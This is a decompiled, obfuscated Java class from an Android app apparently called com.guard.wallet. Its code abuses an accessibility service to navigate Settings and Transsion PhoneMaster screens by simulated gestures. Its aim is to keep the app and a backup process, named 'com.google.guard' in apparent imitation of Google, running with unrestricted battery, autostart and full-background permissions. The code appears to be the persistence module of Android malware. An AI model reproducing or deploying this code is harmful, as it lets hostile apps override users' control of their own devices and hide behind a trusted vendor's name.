package o;

import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import com.guard.wallet.MainApplication;
import com.guard.wallet.condition.StringCondition;
import com.guard.wallet.entity.UiObject;
import com.guard.wallet.filter.CombineFilter;
import com.guard.wallet.filter.CombineFiltersWithOr;
import com.guard.wallet.req.ListenWindow;
import com.guard.wallet.resp.PowerControlStateVO;
import com.guard.wallet.service.MyAccessibilityService;
import java.util.Collections;
import java.util.LinkedList;
import java.util.Objects;
import java.util.concurrent.ConcurrentLinkedQueue;
import java.util.concurrent.ScheduledExecutorService;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicBoolean;
import java.util.concurrent.atomic.AtomicInteger;
import java.util.concurrent.atomic.AtomicReference;
import java.util.concurrent.locks.ReentrantLock;

public final class e0 extends c {
   public static final int y = 0;
   public final AtomicReference r = new AtomicReference<>(r.e.b);
   public final AtomicBoolean s = new AtomicBoolean(false);
   public final AtomicBoolean t = new AtomicBoolean(false);
   public final AtomicBoolean u = new AtomicBoolean(true);
   public final AtomicBoolean v = new AtomicBoolean(true);
   public final AtomicBoolean w = new AtomicBoolean(false);
   public final AtomicBoolean x = new AtomicBoolean(false);

   public e0() {
      super(n0(), "com.android.settings");

      try {
         ScheduledExecutorService var2 = super.p;
         d0 var1 = new d0(this, 3);
         var2.schedule(var1, 60L, TimeUnit.SECONDS);
      } catch (Exception var3) {
         a1.q.s("o.e0", var3);
      }
   }

   public static CombineFilter b0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_BATTERY_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_BATTERY_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow c0() {
      ListenWindow var0 = new ListenWindow("com.android.settings", "com.android.settings.SubSettings");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow d0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.android.settings.applications.InstalledAppDetailsTop");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      if (!a1.q.B(var0)) {
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(o.c.H(var0));
      }

      return var1;
   }

   public static ListenWindow e0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "com.transsion.settings.applications.appinfo.AppInfoSettings");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      if (!a1.q.B(var0)) {
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(o.c.H(var0));
      }

      return var1;
   }

   public static CombineFilter f0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_POWER_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_POWER_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   public static CombineFilter g0() {
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_USE_POWER_TEXT"))) {
         CombineFilter var1 = new CombineFilter();
         StringCondition var0 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         var0.setContains(com.guard.wallet.utils.f.b("COMMON_SETTINGS_USE_POWER_TEXT"));
         var1.getStringConditions().add(var0);
         return var1;
      } else {
         return null;
      }
   }

   public static ListenWindow h0() {
      ListenWindow var0 = new ListenWindow("com.transsion.phonemaster", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow i0() {
      ListenWindow var0 = new ListenWindow("com.transsion.phonemaster", "com.cyin.himgr.autostart.AutoStartActivity");
      o.b.q(32, o.b.r(var0), var0).add(16384);
      return var0;
   }

   public static ListenWindow m0(String var0) {
      ListenWindow var1 = new ListenWindow("com.android.settings", "android.widget.FrameLayout");
      o.b.q(32, o.b.r(var1), var1).add(16384);
      if (!a1.q.B(var0)) {
         var1.setMatchs(new LinkedList<>());
         var1.getMatchs().add(o.c.H(var0));
      }

      return var1;
   }

   public static LinkedList n0() {
      LinkedList var0 = new LinkedList();
      var0.add(o.c.J());
      var0.add(i0());
      var0.add(h0());
      var0.add(d0(null));
      var0.add(e0(null));
      var0.add(m0(null));
      var0.add(c0());
      return var0;
   }

   public static CombineFiltersWithOr q0() {
      CombineFiltersWithOr var3 = new CombineFiltersWithOr();
      var3.setFilters(new LinkedList<>());
      boolean var0 = a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_UNRESTRICTED_TEXT"));
      Object var2 = null;
      CombineFilter var1;
      if (!var0) {
         var1 = new CombineFilter();
         StringCondition var4 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_UNRESTRICTED_TEXT", var4, var1, var4);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_NO_RESTRICTED_TEXT"))) {
         var1 = new CombineFilter();
         StringCondition var8 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_NO_RESTRICTED_TEXT", var8, var1, var8);
      } else {
         var1 = null;
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      var1 = (CombineFilter)var2;
      if (!a1.q.B(com.guard.wallet.utils.f.b("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT"))) {
         var1 = new CombineFilter();
         var2 = o.b.b(var1, a.a.c(var1, "className", "android.widget.TextView"), "text");
         o.b.v("COMMON_SETTINGS_HAS_CANCEL_RESTRICTED_TEXT", (StringCondition)var2, var1, (StringCondition)var2);
      }

      if (var1 != null) {
         var3.getFilters().add(var1);
      }

      return var3;
   }

   @Override
   public final void Z() {
      ReentrantLock var1 = super.o;
      if (var1.tryLock()) {
         try {
            if (!this.T()) {
               Log.d("o.e0", "准备结束本地保活自动化引擎");
               com.guard.wallet.helper.g.h(100);
               this.X();
               if (MyAccessibilityService.P() != null) {
                  MyAccessibilityService.P().x();
               }

               this.p0();
               super.p.shutdownNow();
               com.guard.wallet.thread.l.a(super.c);
               super.n.clear();
               if (a1.q.M()) {
                  com.guard.wallet.utils.g.T0(5);
               }

               com.guard.wallet.helper.g.c();
               Log.d("o.e0", "已结束本地保活自动化引擎");
               o.c.W();
               this.d();
            }
         } catch (Exception var3) {
            a1.q.s("o.e0", var3);
         }

         var1.unlock();
      }
   }

   public final boolean j0() {
      try {
         if (this.q(Collections.singletonList(c0()))) {
            Log.d("o.e0", "已进入App耗电管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.e0", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final boolean k0() {
      Exception var10000;
      label37: {
         String var1;
         label32: {
            try {
               if (Objects.equals(this.r.get(), r.e.c)) {
                  var1 = com.guard.wallet.utils.g.x0();
                  break label32;
               }
            } catch (Exception var5) {
               var10000 = var5;
               boolean var10001 = false;
               break label37;
            }

            try {
               var1 = com.guard.wallet.utils.g.e();
            } catch (Exception var4) {
               var10000 = var4;
               boolean var7 = false;
               break label37;
            }
         }

         try {
            LinkedList var2 = new LinkedList();
            var2.add(d0(var1));
            var2.add(e0(var1));
            var2.add(m0(var1));
            if (this.q(var2)) {
               Log.d("o.e0", "已进入App详情窗口");
               return true;
            }

            return false;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var8 = false;
         }
      }

      Exception var6 = var10000;
      a1.q.s("o.e0", var6);
      return false;
   }

   public final boolean l0() {
      try {
         LinkedList var1 = new LinkedList();
         var1.add(i0());
         var1.add(h0());
         if (this.q(var1)) {
            Log.d("o.e0", "已进入自启动管理窗口");
            return true;
         }
      } catch (Exception var2) {
         a1.q.s("o.e0", var2);
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final UiObject o0(UiObject var1) {
      UiObject var9 = null;
      UiObject var3 = null;
      UiObject var8 = null;
      Object var4 = null;

      UiObject var57;
      label336: {
         label335: {
            UiObject var48;
            label334: {
               label340: {
                  CombineFilter var10;
                  AtomicInteger var11;
                  CombineFilter var12;
                  CombineFilter var13;
                  label332: {
                     Exception var10000;
                     label341: {
                        try {
                           var1.refresh();
                           Log.d("o.e0", "开始滚动电池电量管理栏目");
                           var10 = f0();
                           var12 = b0();
                           var13 = g0();
                           var11 = new AtomicInteger(0);
                        } catch (Exception var44) {
                           var10000 = var44;
                           boolean var10001 = false;
                           break label341;
                        }

                        if (var12 == null && var10 == null && var13 == null) {
                           var1 = null;
                           var57 = null;
                           break label336;
                        }

                        if (var10 == null) {
                           var48 = null;
                           break label332;
                        }

                        try {
                           var48 = var1.findOneByCombine(var10);
                           break label332;
                        } catch (Exception var43) {
                           var10000 = var43;
                           boolean var67 = false;
                        }
                     }

                     var4 = var10000;
                     var1 = null;
                     var48 = null;
                     break label340;
                  }

                  if (var12 != null) {
                     try {
                        var8 = var1.findOneByCombine(var12);
                     } catch (Exception var42) {
                        var4 = var42;
                        var1 = null;
                        break label340;
                     }
                  } else {
                     var8 = null;
                  }

                  UiObject var6;
                  label316: {
                     UiObject var5;
                     Exception var65;
                     label315: {
                        var3 = (UiObject)var4;
                        var57 = var48;
                        var6 = var8;
                        if (var13 != null) {
                           var4 = var48;
                           var5 = var8;

                           try {
                              var3 = var1.findOneByCombine(var13);
                           } catch (Exception var35) {
                              var65 = var35;
                              boolean var68 = false;
                              break label315;
                           }

                           var57 = var48;
                           var6 = var8;
                        }

                        while (true) {
                           var9 = var3;
                           var4 = var57;
                           var5 = var6;

                           label344: {
                              try {
                                 if (!var1.canScrollForward()) {
                                    break label344;
                                 }
                              } catch (Exception var41) {
                                 var65 = var41;
                                 boolean var69 = false;
                                 break;
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 if (var11.incrementAndGet() >= 10) {
                                    break label344;
                                 }
                              } catch (Exception var40) {
                                 var65 = var40;
                                 boolean var70 = false;
                                 break;
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 Log.d("o.e0", "滚动视图可以向下滚动");
                              } catch (Exception var34) {
                                 var65 = var34;
                                 boolean var71 = false;
                                 break;
                              }

                              if (var6 != null) {
                                 var9 = var3;
                                 var4 = var57;
                                 var5 = var6;

                                 try {
                                    if (var6.visibleToUser()) {
                                       break label344;
                                    }
                                 } catch (Exception var39) {
                                    var65 = var39;
                                    boolean var72 = false;
                                    break;
                                 }
                              }

                              if (var57 != null) {
                                 var9 = var3;
                                 var4 = var57;
                                 var5 = var6;

                                 try {
                                    if (var57.visibleToUser()) {
                                       break label344;
                                    }
                                 } catch (Exception var38) {
                                    var65 = var38;
                                    boolean var73 = false;
                                    break;
                                 }
                              }

                              if (var3 != null) {
                                 var9 = var3;
                                 var4 = var57;
                                 var5 = var6;

                                 try {
                                    if (var3.visibleToUser()) {
                                       break label344;
                                    }
                                 } catch (Exception var37) {
                                    var65 = var37;
                                    boolean var74 = false;
                                    break;
                                 }
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 if (!var1.scrollForwardByGesture()) {
                                    continue;
                                 }
                              } catch (Exception var36) {
                                 var65 = var36;
                                 boolean var75 = false;
                                 break;
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 Log.d("o.e0", "向下滚动查找电池电量管理栏目");
                              } catch (Exception var33) {
                                 var65 = var33;
                                 boolean var76 = false;
                                 break;
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 com.guard.wallet.utils.g.T0(10);
                              } catch (Exception var32) {
                                 var65 = var32;
                                 boolean var77 = false;
                                 break;
                              }

                              var9 = var3;
                              var4 = var57;
                              var5 = var6;

                              try {
                                 var1.refresh();
                              } catch (Exception var31) {
                                 var65 = var31;
                                 boolean var78 = false;
                                 break;
                              }

                              var48 = var57;
                              if (var10 != null) {
                                 var9 = var3;
                                 var4 = var57;
                                 var5 = var6;

                                 try {
                                    var48 = var1.findOneByCombine(var10);
                                 } catch (Exception var30) {
                                    var65 = var30;
                                    boolean var79 = false;
                                    break;
                                 }
                              }

                              var8 = var6;
                              if (var12 != null) {
                                 var9 = var3;
                                 var4 = var48;
                                 var5 = var6;

                                 try {
                                    var8 = var1.findOneByCombine(var12);
                                 } catch (Exception var29) {
                                    var65 = var29;
                                    boolean var80 = false;
                                    break;
                                 }
                              }

                              var57 = var48;
                              var6 = var8;
                              if (var13 != null) {
                                 var9 = var3;
                                 var4 = var48;
                                 var5 = var8;

                                 try {
                                    var3 = var1.findOneByCombine(var13);
                                 } catch (Exception var28) {
                                    var65 = var28;
                                    boolean var81 = false;
                                    break;
                                 }

                                 var57 = var48;
                                 var6 = var8;
                              }
                              continue;
                           }

                           var9 = var3;
                           var4 = var57;
                           var5 = var6;

                           try {
                              var11.set(0);
                              break label316;
                           } catch (Exception var27) {
                              var65 = var27;
                              boolean var82 = false;
                              break;
                           }
                        }
                     }

                     Exception var55 = var65;
                     var1 = var9;
                     var3 = var5;
                     var48 = (UiObject)var4;
                     var4 = var55;
                     break label340;
                  }

                  var48 = var57;
                  var9 = var3;
                  var3 = var6;

                  while (true) {
                     UiObject var54 = var9;
                     var6 = var3;
                     var4 = var48;
                     var9 = var3;
                     var57 = var9;
                     var8 = var48;

                     label244: {
                        Exception var66;
                        label347: {
                           try {
                              if (!var1.canScrollBackward()) {
                                 break label335;
                              }
                           } catch (Exception var26) {
                              var66 = var26;
                              boolean var83 = false;
                              break label347;
                           }

                           var6 = var3;
                           var4 = var48;
                           var9 = var3;
                           var57 = var9;
                           var8 = var48;

                           try {
                              if (var11.incrementAndGet() >= 10) {
                                 break label335;
                              }
                           } catch (Exception var25) {
                              var66 = var25;
                              boolean var84 = false;
                              break label347;
                           }

                           var6 = var3;
                           var4 = var48;

                           try {
                              Log.d("o.e0", "滚动视图可以向上滚动");
                           } catch (Exception var24) {
                              var66 = var24;
                              boolean var85 = false;
                              break label347;
                           }

                           if (var3 != null) {
                              var6 = var3;
                              var4 = var48;
                              var9 = var3;
                              var57 = var9;
                              var8 = var48;

                              try {
                                 if (var3.visibleToUser()) {
                                    break label335;
                                 }
                              } catch (Exception var23) {
                                 var66 = var23;
                                 boolean var86 = false;
                                 break label347;
                              }
                           }

                           if (var48 != null) {
                              var6 = var3;
                              var4 = var48;
                              var9 = var3;
                              var57 = var9;
                              var8 = var48;

                              try {
                                 if (var48.visibleToUser()) {
                                    break label335;
                                 }
                              } catch (Exception var22) {
                                 var66 = var22;
                                 boolean var87 = false;
                                 break label347;
                              }
                           }

                           if (var9 != null) {
                              var6 = var3;
                              var4 = var48;

                              try {
                                 if (var54.visibleToUser()) {
                                    break label334;
                                 }
                              } catch (Exception var21) {
                                 var66 = var21;
                                 boolean var88 = false;
                                 break label347;
                              }
                           }

                           var9 = var9;
                           var6 = var3;
                           var4 = var48;

                           try {
                              if (!var1.scrollBackwardByGesture()) {
                                 continue;
                              }
                           } catch (Exception var20) {
                              var66 = var20;
                              boolean var89 = false;
                              break label347;
                           }

                           var6 = var3;
                           var4 = var48;

                           try {
                              Log.d("o.e0", "向上滚动查找电池电量管理栏目");
                           } catch (Exception var19) {
                              var66 = var19;
                              boolean var90 = false;
                              break label347;
                           }

                           var6 = var3;
                           var4 = var48;

                           try {
                              com.guard.wallet.utils.g.T0(10);
                           } catch (Exception var18) {
                              var66 = var18;
                              boolean var91 = false;
                              break label347;
                           }

                           var6 = var3;
                           var4 = var48;

                           try {
                              var1.refresh();
                           } catch (Exception var17) {
                              var66 = var17;
                              boolean var92 = false;
                              break label347;
                           }

                           var57 = var48;
                           if (var10 != null) {
                              var6 = var3;
                              var4 = var48;

                              try {
                                 var57 = var1.findOneByCombine(var10);
                              } catch (Exception var16) {
                                 var66 = var16;
                                 boolean var93 = false;
                                 break label347;
                              }
                           }

                           var8 = var3;
                           if (var12 != null) {
                              var6 = var3;
                              var4 = var57;

                              try {
                                 var8 = var1.findOneByCombine(var12);
                              } catch (Exception var15) {
                                 var66 = var15;
                                 boolean var94 = false;
                                 break label347;
                              }
                           }

                           var3 = var8;
                           var9 = var54;
                           var48 = var57;
                           if (var13 == null) {
                              continue;
                           }

                           var6 = var8;
                           var4 = var57;

                           try {
                              var9 = var1.findOneByCombine(var13);
                              break label244;
                           } catch (Exception var14) {
                              var66 = var14;
                              boolean var95 = false;
                           }
                        }

                        Exception var59 = var66;
                        var3 = var6;
                        var1 = var54;
                        var48 = (UiObject)var4;
                        var4 = var59;
                        break;
                     }

                     var3 = var8;
                     var48 = var57;
                  }
               }

               a1.q.s("o.e0", (Exception)var4);
               var8 = var48;
               var57 = var1;
               var9 = var3;
               break label335;
            }

            var9 = var3;
            var57 = var9;
            var8 = var48;
         }

         var1 = var9;
      }

      if (var8 != null) {
         return var8;
      } else {
         return var1 != null ? var1 : var57;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public final void p0() {
      Exception var10000;
      label100: {
         PowerControlStateVO var1;
         try {
            var1 = com.guard.wallet.utils.h.k(MainApplication.getAppContext().getPackageName());
            var1.setPackageName(MainApplication.getAppContext().getPackageName());
         } catch (Exception var11) {
            var10000 = var11;
            boolean var10001 = false;
            break label100;
         }

         AtomicBoolean var2 = this.s;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var19 = false;
            break label100;
         }

         var2 = this.u;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var9) {
            var10000 = var9;
            boolean var20 = false;
            break label100;
         }

         var2 = this.w;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var8) {
            var10000 = var8;
            boolean var21 = false;
            break label100;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.e0", "主进程保活策略已保存");
            var1 = com.guard.wallet.utils.h.k("com.google.guard");
            var1.setPackageName("com.google.guard");
         } catch (Exception var7) {
            var10000 = var7;
            boolean var22 = false;
            break label100;
         }

         var2 = this.t;

         try {
            if (var2.get()) {
               var1.setAllowAutoStart(var2.get());
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var23 = false;
            break label100;
         }

         var2 = this.v;

         try {
            if (var2.get()) {
               var1.setAllowRelateStart(var2.get());
            }
         } catch (Exception var5) {
            var10000 = var5;
            boolean var24 = false;
            break label100;
         }

         var2 = this.x;

         try {
            if (var2.get()) {
               var1.setAllowAllFullBackground(var2.get());
            }
         } catch (Exception var4) {
            var10000 = var4;
            boolean var25 = false;
            break label100;
         }

         try {
            var1.setRetryCount(var1.getRetryCount() + 1);
            com.guard.wallet.utils.h.L(var1);
            Log.d("o.e0", "备用进程保活策略已保存");
            return;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var26 = false;
         }
      }

      Exception var13 = var10000;
      a1.q.s("o.e0", var13);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   @Override
   public final void u(AccessibilityEvent var1, String var2, String var3) {
      Exception var10000;
      label64: {
         try {
            if (this.T()) {
               return;
            }
         } catch (Exception var10) {
            var10000 = var10;
            boolean var10001 = false;
            break label64;
         }

         if (var1 != null) {
            try {
               super.u(var1, var2, var3);
            } catch (Exception var9) {
               var10000 = var9;
               boolean var17 = false;
               break label64;
            }
         }

         boolean var4;
         try {
            var4 = this.k0();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var18 = false;
            break label64;
         }

         String var11 = super.c;
         ConcurrentLinkedQueue var13 = super.n;
         if (var4) {
            try {
               var13.remove("keepAliveInAppBattery");
               var13.remove("keepAliveInAutoStart");
               if (!var13.contains("keepAliveInAppDetail")) {
                  var13.add("keepAliveInAppDetail");
                  d0 var15 = new d0(this, 0);
                  com.guard.wallet.thread.l.c(var15, var11);
               }
            } catch (Exception var7) {
               var10000 = var7;
               boolean var19 = false;
               break label64;
            }
         }

         try {
            if (this.j0()) {
               var13.remove("keepAliveInAppDetail");
               var13.remove("keepAliveInAutoStart");
               if (!var13.contains("keepAliveInAppBattery")) {
                  var13.add("keepAliveInAppBattery");
                  d0 var16 = new d0(this, 1);
                  com.guard.wallet.thread.l.c(var16, var11);
               }
            }
         } catch (Exception var6) {
            var10000 = var6;
            boolean var20 = false;
            break label64;
         }

         try {
            if (this.l0()) {
               var13.remove("keepAliveInAppDetail");
               var13.remove("keepAliveInAppBattery");
               if (!var13.contains("keepAliveInAutoStart")) {
                  var13.add("keepAliveInAutoStart");
                  d0 var14 = new d0(this, 2);
                  com.guard.wallet.thread.l.c(var14, var11);
                  return;
               }
            }

            return;
         } catch (Exception var5) {
            var10000 = var5;
            boolean var21 = false;
         }
      }

      Exception var12 = var10000;
      a1.q.s("o.e0", var12);
   }
}
